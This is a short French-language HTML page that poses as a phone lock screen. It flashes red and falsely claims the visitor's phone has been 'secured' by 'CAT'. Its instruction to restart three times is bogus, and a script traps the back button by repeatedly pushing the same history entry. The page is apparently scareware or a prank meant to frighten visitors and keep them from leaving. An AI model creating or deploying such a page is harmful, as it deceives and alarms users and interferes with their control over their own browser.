<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔴 VERROUILLÉ</title>
<style>
  * { margin:0; padding:0; }
  body {
    background: #0a0a0a;
    color: #ff3355;
    font-family: monospace;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
    animation: flash 0.5s infinite alternate;
  }
  @keyframes flash {
    0% { background: #0a0a0a; }
    100% { background: #1a0000; }
  }
  .box { max-width: 400px; padding: 30px; border: 2px solid #ff3355; border-radius: 20px; }
  h1 { font-size: 2.5em; }
  p { color: #ff8888; margin: 15px 0; }
</style>
</head>
<body>
<div class="box">
  <h1>🔴 VERROUILLÉ</h1>
  <p>Votre téléphone a été sécurisé par <strong>CAT</strong>.</p>
  <p style="font-size:0.8em; color:#666;">Redémarrez 3 fois pour déverrouiller.</p>
</div>
<script>
  history.pushState(null, null, location.href);
  window.onpopstate = () => history.pushState(null, null, location.href);
</script>
</body>
</html>
